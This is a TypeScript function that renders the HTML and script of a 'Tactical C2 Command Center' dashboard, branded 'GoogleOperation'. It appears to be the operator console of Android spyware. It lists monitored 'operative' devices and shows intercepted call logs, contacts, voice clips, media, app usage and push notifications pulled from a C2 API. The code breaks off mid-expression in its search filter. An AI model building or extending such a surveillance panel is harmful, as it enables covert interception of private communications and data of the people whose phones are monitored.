export function renderDashboardHtml(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GoogleOperation // Tactical C2 Command Center</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-dark: #090d16;
      --bg-card: #111827;
      --bg-card-hover: #1f293d;
      --border-color: #1e293b;
      --border-accent: #334155;
      --text-primary: #f1f5f9;
      --text-secondary: #94a3b8;
      --text-muted: #64748b;
      --accent-blue: #38bdf8;
      --accent-green: #34d399;
      --accent-red: #f43f5e;
      --accent-amber: #fbbf24;
      --accent-purple: #a855f7;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-dark);
      color: var(--text-primary);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .mono {
      font-family: 'JetBrains Mono', monospace;
    }

    /* Top Navigation */
    .navbar {
      background: rgba(17, 24, 39, 0.95);
      border-bottom: 1px solid var(--border-color);
      padding: 12px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 100;
      backdrop-filter: blur(12px);
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .brand-tag {
      background: #0284c7;
      color: #fff;
      font-size: 11px;
      font-weight: 700;
      padding: 3px 8px;
      border-radius: 4px;
      letter-spacing: 0.5px;
    }

    .brand-title {
      font-size: 16px;
      font-weight: 700;
      letter-spacing: -0.3px;
    }

    .brand-sub {
      color: var(--text-muted);
      font-size: 13px;
    }

    .nav-actions {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .fleet-select-wrapper {
      display: flex;
      align-items: center;
      gap: 8px;
      background: #1e293b;
      padding: 4px 10px;
      border-radius: 6px;
      border: 1px solid var(--border-accent);
    }

    .fleet-select-label {
      font-size: 11px;
      font-weight: 700;
      color: var(--text-secondary);
      letter-spacing: 0.5px;
    }

    .fleet-select {
      background: transparent;
      border: none;
      color: var(--text-primary);
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      font-weight: 600;
      outline: none;
      cursor: pointer;
    }

    .fleet-select option {
      background: var(--bg-card);
      color: var(--text-primary);
    }

    .status-pill {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 12px;
      padding: 6px 12px;
      border-radius: 20px;
      background: rgba(16, 185, 129, 0.1);
      color: var(--accent-green);
      border: 1px solid rgba(16, 185, 129, 0.2);
    }

    .status-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: var(--accent-green);
      box-shadow: 0 0 8px var(--accent-green);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.3; }
      100% { opacity: 1; }
    }

    .btn-action {
      background: #1e293b;
      border: 1px solid var(--border-accent);
      color: var(--text-primary);
      padding: 6px 14px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }

    .btn-action:hover {
      background: #334155;
      border-color: #475569;
    }

    .btn-danger {
      background: rgba(244, 63, 94, 0.1);
      color: var(--accent-red);
      border-color: rgba(244, 63, 94, 0.3);
    }

    .btn-danger:hover {
      background: rgba(244, 63, 94, 0.2);
      border-color: var(--accent-red);
    }

    /* Duress Warning Banner */
    .duress-banner {
      display: none;
      background: #881337;
      color: #ffe4e6;
      padding: 10px 24px;
      border-bottom: 1px solid var(--accent-red);
      font-size: 13px;
      font-weight: 600;
      align-items: center;
      justify-content: space-between;
      animation: flashRed 1.5s infinite;
    }

    .duress-banner.active {
      display: flex;
    }

    @keyframes flashRed {
      0%, 100% { background: #881337; }
      50% { background: #e11d48; color: #fff; }
    }

    /* Main Container */
    .container {
      max-width: 1440px;
      margin: 0 auto;
      padding: 24px;
      width: 100%;
      flex: 1;
    }

    /* Top Stats Grid */
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px;
      margin-bottom: 24px;
    }

    .stat-card {
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 6px;
      transition: transform 0.2s, border-color 0.2s;
    }

    .stat-card:hover {
      border-color: var(--border-accent);
    }

    .stat-label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-muted);
      font-weight: 600;
    }

    .stat-value {
      font-size: 24px;
      font-weight: 700;
      color: var(--text-primary);
    }

    .stat-sub {
      font-size: 11px;
      color: var(--text-secondary);
    }

    /* 2-Column Layout */
    .main-grid {
      display: grid;
      grid-template-columns: 340px 1fr;
      gap: 24px;
      align-items: start;
    }

    @media (max-width: 1024px) {
      .main-grid {
        grid-template-columns: 1fr;
      }
    }

    /* Left Column: Fleet Directory & Hardware State */
    .left-column {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .panel-box {
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      overflow: hidden;
    }

    .panel-header {
      padding: 14px 16px;
      background: rgba(255, 255, 255, 0.02);
      border-bottom: 1px solid var(--border-color);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .panel-title {
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 0.5px;
      color: var(--text-secondary);
      text-transform: uppercase;
    }

    .operative-tile {
      padding: 14px 16px;
      border-bottom: 1px solid var(--border-color);
      cursor: pointer;
      transition: background 0.2s;
    }

    .operative-tile:last-child {
      border-bottom: none;
    }

    .operative-tile:hover {
      background: var(--bg-card-hover);
    }

    .operative-tile.selected {
      background: rgba(56, 189, 248, 0.08);
      border-left: 3px solid var(--accent-blue);
    }

    .tile-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 4px;
    }

    .tile-name {
      font-weight: 600;
      font-size: 14px;
      color: var(--text-primary);
    }

    .tile-sub {
      font-size: 11px;
      color: var(--text-muted);
      margin-bottom: 8px;
    }

    .tile-metrics {
      display: flex;
      gap: 12px;
      font-size: 11px;
      color: var(--text-secondary);
    }

    .field-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 8px 16px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
      font-size: 12px;
    }

    .field-row:last-child {
      border-bottom: none;
    }

    .field-label {
      color: var(--text-muted);
    }

    .field-value {
      font-weight: 500;
      color: var(--text-primary);
    }

    /* Right Column: Feeds & Tabs */
    .feeds-column {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .tabs-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid var(--border-color);
      padding-bottom: 12px;
      flex-wrap: wrap;
      gap: 12px;
    }

    .tabs {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .tab-btn {
      background: transparent;
      border: 1px solid transparent;
      color: var(--text-secondary);
      padding: 8px 14px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }

    .tab-btn:hover {
      color: var(--text-primary);
      background: var(--bg-card);
    }

    .tab-btn.active {
      background: var(--accent-blue);
      color: #04121d;
      font-weight: 700;
    }

    .active-filter-indicator {
      font-size: 11px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 4px;
      border: 1px solid var(--border-accent);
      color: var(--accent-blue);
      background: rgba(56, 189, 248, 0.1);
    }

    /* Search & Filter Bar */
    .search-filter-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      background: var(--bg-card);
      padding: 10px 14px;
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }

    .search-box {
      display: flex;
      align-items: center;
      gap: 8px;
      flex: 1;
    }

    .search-input {
      background: transparent;
      border: none;
      color: var(--text-primary);
      font-family: 'Inter', sans-serif;
      font-size: 13px;
      width: 100%;
      outline: none;
    }

    .search-input::placeholder {
      color: var(--text-muted);
    }

    .page-size-select {
      background: #1e293b;
      border: 1px solid var(--border-accent);
      color: var(--text-secondary);
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
      padding: 4px 8px;
      border-radius: 4px;
      outline: none;
      cursor: pointer;
    }

    .tab-content {
      display: none;
    }

    .tab-content.active {
      display: block;
    }

    .feed-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .feed-item {
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 8px;
      transition: border-color 0.2s;
    }

    .feed-item:hover {
      border-color: var(--border-accent);
    }

    .item-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 8px;
    }

    .item-title {
      font-weight: 600;
      font-size: 14px;
      color: var(--text-primary);
    }

    .item-badges {
      display: flex;
      gap: 6px;
      align-items: center;
      flex-wrap: wrap;
    }

    .badge {
      font-size: 10px;
      font-weight: 700;
      padding: 2px 6px;
      border-radius: 4px;
      letter-spacing: 0.3px;
      text-transform: uppercase;
    }

    .badge-unit {
      background: #1e293b;
      color: var(--accent-blue);
      border: 1px solid rgba(56, 189, 248, 0.3);
    }

    .badge-unit.highlight {
      background: rgba(56, 189, 248, 0.2);
      color: #7dd3fc;
      border-color: #38bdf8;
    }

    .badge-incoming { background: #064e3b; color: #34d399; }
    .badge-outgoing { background: #0c4a6e; color: #38bdf8; }
    .badge-missed { background: #7f1d1d; color: #f87171; }
    .badge-rejected { background: #451a03; color: #fb923c; }

    .badge-voice { background: #4c1d95; color: #c084fc; }
    .badge-image { background: #065f46; color: #34d399; }
    .badge-video { background: #1e3a8a; color: #60a5fa; }
    .badge-audio { background: #581c87; color: #c084fc; }
    .badge-pdf { background: #78350f; color: #fbbf24; }

    .filter-chip {
      background: #1e293b;
      border: 1px solid var(--border-color);
      color: var(--text-muted);
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
    }
    .filter-chip:hover {
      background: #334155;
      color: var(--text-primary);
    }
    .filter-chip.active {
      background: rgba(56, 189, 248, 0.15);
      border-color: var(--accent-blue);
      color: var(--accent-blue);
    }
    .filter-chip.active-amber {
      background: rgba(251, 191, 36, 0.15);
      border-color: var(--accent-amber);
      color: var(--accent-amber);
    }
    .feed-item.realtime-intercept {
      border: 1px solid rgba(251, 191, 36, 0.4);
      background: rgba(251, 191, 36, 0.03);
      position: relative;
    }
    .feed-item.realtime-intercept::before {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      bottom: 0;
      width: 3px;
      background: var(--accent-amber);
      border-radius: 4px 0 0 4px;
    }
    .badge-sheet { background: #065f46; color: #6ee7b7; border: 1px solid rgba(110, 231, 183, 0.3); }

    .badge-encrypted { background: #065f46; color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
    .badge-financial { background: #854d0e; color: #fde047; border: 1px solid rgba(253, 224, 71, 0.3); }
    .badge-nav { background: #1e3a8a; color: #93c5fd; }
    .badge-browser { background: #3730a3; color: #c7d2fe; }
    .badge-social { background: #701a75; color: #f472b6; }
    .badge-system { background: #334155; color: #cbd5e1; }

    .item-desc {
      font-size: 13px;
      color: var(--text-secondary);
      line-height: 1.4;
    }

    .item-meta {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      color: var(--text-muted);
      border-top: 1px solid rgba(255, 255, 255, 0.04);
      padding-top: 8px;
      margin-top: 4px;
      flex-wrap: wrap;
      gap: 8px;
    }

    .audio-player-box {
      background: #0d131f;
      border: 1px solid var(--border-color);
      border-radius: 6px;
      padding: 10px;
      margin-top: 6px;
    }

    audio {
      width: 100%;
      height: 36px;
      outline: none;
    }

    /* Media Grid */
    .media-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 16px;
    }

    .media-card {
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .media-preview {
      height: 130px;
      background: #0a0f1d;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .media-preview img, .media-preview video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .media-info {
      padding: 10px 12px;
      display: flex;
      flex-direction: column;
      gap: 4px;
    }

    .media-name {
      font-size: 12px;
      font-weight: 600;
      color: var(--text-primary);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .media-link {
      font-size: 11px;
      color: var(--accent-blue);
      text-decoration: none;
      font-family: 'JetBrains Mono', monospace;
    }

    .media-link:hover {
      text-decoration: underline;
    }

    /* Pagination Controls */
    .pagination-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 10px 16px;
      margin-top: 14px;
      font-size: 12px;
      color: var(--text-secondary);
      flex-wrap: wrap;
      gap: 8px;
    }

    .pagination-btns {
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .page-btn {
      background: #1e293b;
      border: 1px solid var(--border-accent);
      color: var(--text-primary);
      padding: 4px 10px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }

    .page-btn:hover:not(:disabled) {
      background: #334155;
      color: #fff;
    }

    .page-btn:disabled {
      opacity: 0.35;
      cursor: not-allowed;
    }

    .empty-state {
      padding: 40px;
      text-align: center;
      color: var(--text-muted);
      font-size: 13px;
      background: var(--bg-card);
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }
  </style>
</head>
<body>

  <!-- Silent Duress Warning Banner -->
  <div class="duress-banner" id="duressBanner">
    <div>🚨 EMERGENCY DURESS BEACON TRIGGERED — ACTIVE THREAT DETECTED ON TARGET UNIT</div>
    <div class="mono" id="duressDetails">Unit: OP-UNKNOWN</div>
  </div>

  <!-- Navbar -->
  <header class="navbar">
    <div class="brand">
      <span class="brand-tag mono">TACTICAL C2</span>
      <div>
        <div class="brand-title">GoogleOperation <span class="brand-sub">// Multi-Unit Fleet Command</span></div>
      </div>
    </div>

    <div class="nav-actions">
      <!-- Target Unit Filter Dropdown -->
      <div class="fleet-select-wrapper">
        <span class="fleet-select-label mono">TARGET UNIT:</span>
        <select class="fleet-select" id="deviceSelector" onchange="onDeviceSelectChange(this.value)">
          <option value="ALL">ALL OPERATIVES (Fleet View)</option>
        </select>
      </div>

      <div class="status-pill mono">
        <div class="status-dot"></div>
        <span>LIVE POLLING [3s]</span>
      </div>

      <button class="btn-action mono" onclick="fetchOverview()">Sync Now</button>
      <button class="btn-action btn-danger mono" onclick="purgeLogs()">Purge Demo Logs</button>
    </div>
  </header>

  <div class="container">
    <!-- Top KPI Metrics -->
    <div class="stats-grid">
      <div class="stat-card">
        <span class="stat-label">Registered Units</span>
        <span class="stat-value mono" id="statDevices">0</span>
        <span class="stat-sub mono" id="statDevicesSub">0 units online</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Intercepted Calls</span>
        <span class="stat-value mono" id="statCalls">0</span>
        <span class="stat-sub mono" id="statCallsSub">Fleet Total</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Voice Activity Clips</span>
        <span class="stat-value mono" id="statVoice">0</span>
        <span class="stat-sub mono" id="statVoiceSub">Fleet Total</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Media & Documents</span>
        <span class="stat-value mono" id="statMedia">0</span>
        <span class="stat-sub mono" id="statMediaSub">Fleet Total</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Phonebook Contacts</span>
        <span class="stat-value mono" id="statContacts">0</span>
        <span class="stat-sub mono" id="statContactsSub">Fleet Total</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Apps Tracked</span>
        <span class="stat-value mono" id="statApps">0</span>
        <span class="stat-sub mono" id="statAppsSub">Installed Apps</span>
      </div>

      <div class="stat-card">
        <span class="stat-label">Notifications</span>
        <span class="stat-value mono" id="statNotifs">0</span>
        <span class="stat-sub mono" id="statNotifsSub">Fleet Total</span>
      </div>
    </div>

    <!-- Main Layout Grid -->
    <div class="main-grid">
      <!-- Left: Fleet Directory & Target Unit Info -->
      <div class="left-column">
        <div class="panel-box">
          <div class="panel-header">
            <span class="panel-title">Operative Fleet Directory</span>
            <span class="badge mono" style="background:#1e293b; color:#38bdf8;" id="fleetCountBadge">0 UNITS</span>
          </div>
          <div id="fleetTilesContainer">
            <div class="empty-state" style="padding:20px;">No operative units detected</div>
          </div>
        </div>

        <div class="panel-box">
          <div class="panel-header">
            <span class="panel-title">Active Unit Telemetry</span>
            <span class="badge badge-unit mono" id="selectedUnitBadge">ALL FLEET</span>
          </div>
          <div id="selectedUnitDetails">
            <div class="field-row">
              <span class="field-label">Target View</span>
              <span class="field-value mono">All Fleet Operatives</span>
            </div>
            <div class="field-row">
              <span class="field-label">Online Units</span>
              <span class="field-value mono" id="onlineCountField">0 / 0</span>
            </div>
            <div class="field-row">
              <span class="field-label">Heartbeat Rate</span>
              <span class="field-value mono" style="color:var(--accent-green);">Every 5 Minutes</span>
            </div>
            <div class="field-row">
              <span class="field-label">Cloud Backend</span>
              <span class="field-value mono">Cloudflare D1 SQL</span>
            </div>
            <div class="field-row">
              <span class="field-label">Media Storage</span>
              <span class="field-value mono">Backblaze B2</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Right: Intelligence Streams -->
      <div class="feeds-column">
        <div class="tabs-bar">
          <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('calls')">Call Logs & Telephony</button>
            <button class="tab-btn" onclick="switchTab('contacts')">📇 Contacts & Phonebook</button>
            <button class="tab-btn" onclick="switchTab('voice')">Voice Activity Intercepts</button>
            <button class="tab-btn" onclick="switchTab('media')">Media & Documents</button>
            <button class="tab-btn" onclick="switchTab('usage')">Screen & App Intelligence</button>
            <button class="tab-btn" onclick="switchTab('notifs')">Push Notifications</button>
          </div>

          <div class="active-filter-indicator mono" id="activeFilterBadge">
            FILTER: ALL UNITS
          </div>
        </div>

        <!-- Search & Page Size Bar -->
        <div class="search-filter-bar">
          <div class="search-box">
            <span style="font-size:14px; opacity:0.6;">🔍</span>
            <input type="text" class="search-input" id="globalSearchInput" placeholder="Filter by contact, number, app name, package, audio threat, or file..." oninput="onSearchChange(this.value)">
          </div>
          <div style="display:flex; align-items:center; gap:6px;">
            <span class="mono" style="font-size:11px; color:var(--text-muted);">PAGE SIZE:</span>
            <select class="page-size-select" id="pageSizeSelect" onchange="onPageSizeChange(this.value)">
              <option value="10">10</option>
              <option value="15" selected>15</option>
              <option value="25">25</option>
              <option value="50">50</option>
            </select>
          </div>
        </div>

        <!-- Tab 1: Calls -->
        <div class="tab-content active" id="tab-calls">
          <div class="feed-list" id="callsList">
            <div class="empty-state">No call logs captured yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationCalls" style="display:none;"></div>
        </div>

        <!-- Tab: Contacts & Phonebook -->
        <div class="tab-content" id="tab-contacts">
          <div style="display:flex; gap:8px; margin-bottom:12px; align-items:center; flex-wrap:wrap;">
            <button class="filter-chip active mono" id="contactFilterAll" onclick="setContactFilter('ALL')">ALL CONTACTS (<span id="countContactsAll">0</span>)</button>
            <button class="filter-chip mono" id="contactFilterNew" onclick="setContactFilter('NEW')" style="color:var(--accent-amber);">⚡ REAL-TIME NEWLY INTERCEPTED (<span id="countContactsNew">0</span>)</button>
            <button class="filter-chip mono" id="contactFilterBaseline" onclick="setContactFilter('BASELINE')">📚 INITIAL PHONEBOOK BASELINE (<span id="countContactsBaseline">0</span>)</button>
          </div>
          <div class="feed-list" id="contactsList">
            <div class="empty-state">No contacts synced yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationContacts" style="display:none;"></div>
        </div>

        <!-- Tab 2: Voice Activity Intercepts -->
        <div class="tab-content" id="tab-voice">
          <div class="feed-list" id="voiceList">
            <div class="empty-state">No voice activity clips detected yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationVoice" style="display:none;"></div>
        </div>

        <!-- Tab 3: Media & Documents -->
        <div class="tab-content" id="tab-media">
          <div class="media-grid" id="mediaGrid">
            <div class="empty-state" style="grid-column: 1/-1;">No media files uploaded yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationMedia" style="display:none;"></div>
        </div>

        <!-- Tab 4: Screen & App Usage Intelligence -->
        <div class="tab-content" id="tab-usage">
          <div class="feed-list" id="usageList">
            <div class="empty-state">No app usage telemetry captured yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationUsage" style="display:none;"></div>
        </div>

        <!-- Tab 5: Push Notifications -->
        <div class="tab-content" id="tab-notifs">
          <div class="feed-list" id="notifsList">
            <div class="empty-state">No notifications captured yet</div>
          </div>
          <div class="pagination-bar mono" id="paginationNotifs" style="display:none;"></div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let currentTab = 'calls';
    let selectedDeviceId = 'ALL';
    let cachedOverviewData = null;
    let searchQuery = '';
    let pageSize = 15;
    let contactSubFilter = 'ALL';

    const pageState = {
      calls: 1,
      contacts: 1,
      voice: 1,
      media: 1,
      usage: 1,
      notifs: 1
    };

    function setContactFilter(type) {
      contactSubFilter = type;
      pageState.contacts = 1;
      document.querySelectorAll('#tab-contacts .filter-chip').forEach(b => b.classList.remove('active', 'active-amber'));
      if (type === 'ALL') {
        const btn = document.getElementById('contactFilterAll');
        if (btn) btn.classList.add('active');
      } else if (type === 'NEW') {
        const btn = document.getElementById('contactFilterNew');
        if (btn) btn.classList.add('active-amber');
      } else if (type === 'BASELINE') {
        const btn = document.getElementById('contactFilterBaseline');
        if (btn) btn.classList.add('active');
      }
      renderAllFeeds();
    }

    function switchTab(tabName) {
      currentTab = tabName;
      document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

      const activeBtn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick').includes(tabName));
      if (activeBtn) activeBtn.classList.add('active');

      const targetContent = document.getElementById('tab-' + tabName);
      if (targetContent) targetContent.classList.add('active');
      renderAllFeeds();
    }

    function onDeviceSelectChange(devId) {
      selectedDeviceId = devId;
      resetPages();
      updateFilterUI();
      renderAllFeeds();
    }

    function selectDeviceTile(devId) {
      selectedDeviceId = devId;
      const dropdown = document.getElementById('deviceSelector');
      if (dropdown) dropdown.value = devId;
      resetPages();
      updateFilterUI();
      renderAllFeeds();
    }

    function onSearchChange(val) {
      searchQuery = (val || '').toLowerCase().trim();
      resetPages();
      renderAllFeeds();
    }

    function onPageSizeChange(val) {
      pageSize = parseInt(val, 10) || 15;
      resetPages();
      renderAllFeeds();
    }

    function resetPages() {
      pageState.calls = 1;
      pageState.voice = 1;
      pageState.media = 1;
      pageState.usage = 1;
      pageState.notifs = 1;
    }

    function setPage(tab, page) {
      pageState[tab] = page;
      renderAllFeeds();
    }

    function updateFilterUI() {
      const badge = document.getElementById('activeFilterBadge');
      if (selectedDeviceId === 'ALL') {
        badge.textContent = 'FILTER: ALL UNITS';
        badge.style.color = '#38bdf8';
        badge.style.background = 'rgba(56, 189, 248, 0.1)';
        badge.style.borderColor = 'rgba(56, 189, 248, 0.2)';
      } else {
        badge.textContent = 'FILTER: ' + selectedDeviceId;
        badge.style.color = '#34d399';
        badge.style.background = 'rgba(16, 185, 129, 0.1)';
        badge.style.borderColor = 'rgba(16, 185, 129, 0.3)';
      }
    }

    function getB2ViewUrl(url) {
      if (!url) return '';
      return '/api/b2/view?file=' + encodeURIComponent(url);
    }

    function timeAgo(ms) {
      if (!ms) return 'Unknown';
      const seconds = Math.floor((Date.now() - ms) / 1000);
      if (seconds < 5) return 'Just now';
      if (seconds < 60) return seconds + 's ago';
      const minutes = Math.floor(seconds / 60);
      if (minutes < 60) return minutes + 'm ago';
      const hours = Math.floor(minutes / 60);
      if (hours < 24) return hours + 'h ago';
      return Math.floor(hours / 24) + 'd ago';
    }

    function formatTimestamp(ms) {
      if (!ms) return 'Unknown';
      const d = new Date(ms);
      const now = new Date();
      const isToday = d.toDateString() === now.toDateString();
      const timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const dateStr = d.toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' });
      
      if (isToday) {
        return 'Today at ' + timeStr + ' (' + timeAgo(ms) + ')';
      }
      return dateStr + ' at ' + timeStr + ' (' + timeAgo(ms) + ')';
    }

    function formatDuration(ms) {
      if (!ms || ms <= 0) return '0s';
      const totalSec = Math.floor(ms / 1000);
      const hrs = Math.floor(totalSec / 3600);
      const mins = Math.floor((totalSec % 3600) / 60);
      const secs = totalSec % 60;

      if (hrs > 0) return \`\${hrs}h \${mins}m \${secs}s\`;
      if (mins > 0) return \`\${mins}m \${secs}s\`;
      return \`\${secs}s\`;
    }

    function isDeviceOnline(lastSeen) {
      if (!lastSeen) return false;
      return (Date.now() - lastSeen) < 360000; // 6 minutes threshold (matching 5-min heartbeat)
    }

    async function fetchOverview() {
      try {
        const res = await fetch('/api/c2/overview');
        if (!res.ok) return;
        const data = await res.json();
        if (!data.success) return;

        cachedOverviewData = data;

        updateDeviceDropdown(data.devices || []);
        renderFleetTiles(data.devices || []);

        const duressBanner = document.getElementById('duressBanner');
        const activeDuress = (data.duress_alerts || []).filter(d => selectedDeviceId === 'ALL' || d.device_id === selectedDeviceId);
        if (activeDuress.length > 0) {
          duressBanner.classList.add('active');
          document.getElementById('duressDetails').textContent = \`Unit: \${activeDuress[0].device_id} (\${timeAgo(activeDuress[0].timestamp)})\`;
        } else {
          duressBanner.classList.remove('active');
        }

        renderAllFeeds();
      } catch (err) {
        console.error('overview sync error', err);
      }
    }

    function updateDeviceDropdown(devices) {
      const dropdown = document.getElementById('deviceSelector');
      const currentVal = dropdown.value || selectedDeviceId;

      let optionsHtml = '<option value="ALL">ALL OPERATIVES (Fleet View)</option>';
      devices.forEach(dev => {
        const isSelected = dev.device_id === currentVal ? 'selected' : '';
        optionsHtml += \`<option value="\${dev.device_id}" \${isSelected}>\${dev.device_model || 'Android'} (\${dev.device_id})</option>\`;
      });

      dropdown.innerHTML = optionsHtml;
      if (dropdown.value !== currentVal) {
        dropdown.value = currentVal;
      }
    }

    function renderFleetTiles(devices) {
      const container = document.getElementById('fleetTilesContainer');
      const countBadge = document.getElementById('fleetCountBadge');
      countBadge.textContent = \`\${devices.length} UNITS\`;

      if (devices.length === 0) {
        container.innerHTML = '<div class="empty-state" style="padding:20px;">No operative units registered</div>';
        return;
      }

      container.innerHTML = devices.map(dev => {
        const isOnline = isDeviceOnline(dev.last_seen);
        const isSelected = selectedDeviceId === dev.device_id;
        const onlineTag = isOnline
          ? '<span class="badge mono" style="background:#065f46; color:#34d399;">ONLINE</span>'
          : '<span class="badge mono" style="background:#334155; color:#94a3b8;">STANDBY</span>';

        return \`
          <div class="operative-tile \${isSelected ? 'selected' : ''}" onclick="selectDeviceTile('\${dev.device_id}')">
            <div class="tile-top">
              <span class="tile-name">\${dev.device_model || 'Android Device'}</span>
              \${onlineTag}
            </div>
            <div class="tile-sub mono">\${dev.device_id}</div>
            <div class="tile-metrics mono">
              <span style="color:\${dev.battery_level < 20 ? 'var(--accent-red)' : 'var(--text-primary)'}">🔋 \${dev.battery_level}%</span>
              <span style="color:var(--accent-blue);">📶 \${dev.network_type || '5G'}</span>
              <span style="color:var(--accent-green);">📱 \${dev.active_app || 'Idle'}</span>
            </div>
          </div>
        \`;
      }).join('');
    }

    function renderPaginationHtml(tab, totalItems, currentPage, pSize) {
      const totalPages = Math.max(1, Math.ceil(totalItems / pSize));
      if (totalItems <= pSize) {
        return \`<div>Showing <strong>\${totalItems}</strong> of <strong>\${totalItems}</strong> entries</div><div>Page 1 of 1</div>\`;
      }

      const start = (currentPage - 1) * pSize + 1;
      const end = Math.min(totalItems, currentPage * pSize);

      return \`
        <div>Showing <strong>\${start}–\${end}</strong> of <strong>\${totalItems}</strong> entries</div>
        <div class="pagination-btns">
          <button class="page-btn" onclick="setPage('\${tab}', 1)" \${currentPage === 1 ? 'disabled' : ''}>&laquo; First</button>
          <button class="page-btn" onclick="setPage('\${tab}', \${currentPage - 1})" \${currentPage === 1 ? 'disabled' : ''}>&lsaquo; Prev</button>
          <span style="padding:0 8px; font-weight:700;">Page \${currentPage} of \${totalPages}</span>
          <button class="page-btn" onclick="setPage('\${tab}', \${currentPage + 1})" \${currentPage === totalPages ? 'disabled' : ''}>Next &rsaquo;</button>
          <button class="page-btn" onclick="setPage('\${tab}', \${totalPages})" \${currentPage === totalPages ? 'disabled' : ''}>Last &raquo;</button>
        </div>
      \`;
    }

    function renderAllFeeds() {
      if (!cachedOverviewData) return;
      const data = cachedOverviewData;
      const devFilter = selectedDeviceId;

      // 1. Filter arrays by device
      let allCalls = (data.calls || []).filter(c => devFilter === 'ALL' || c.device_id === devFilter);
      let allContacts = (data.contacts || []).filter(c => devFilter === 'ALL' || c.device_id === devFilter);
      let allVoice = (data.voice_events || []).filter(v => devFilter === 'ALL' || v.device_id === devFilter);
      let allMedia = (data.media || []).filter(m => devFilter === 'ALL' || m.device_id === devFilter);
      let allUsage = (data.app_usage || []).filter(u => devFilter === 'ALL' || u.device_id === devFilter);
      let allNotifs = (data.notifications || []).filter(n => devFilter === 'ALL' || n.device_id === devFilter);

      // 2. Apply search query
      if (searchQuery.length > 0) {
        allCalls = allCalls.filter(c => 
          (c.phone_number || '').toLowerCase().includes(searchQuery) ||
